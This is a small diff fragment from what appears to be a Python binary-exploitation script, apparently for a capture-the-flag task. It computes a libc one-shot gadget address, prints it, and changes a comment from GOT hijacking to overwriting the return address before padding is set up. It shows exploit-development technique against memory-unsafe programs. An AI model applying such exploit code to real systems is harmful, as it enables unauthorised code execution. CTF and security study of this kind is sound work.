@@ -53,7 +53,7 @@ if LOCAL == True:
 else:
     system = libc_base + one_shot_off[1]
 print "[+] evaluated system at: " + hex(system)
-###### hijack GOT now ######
+###### overwriting the ret address ######
 
 """
 pad_1 = int("40", 16) - 1
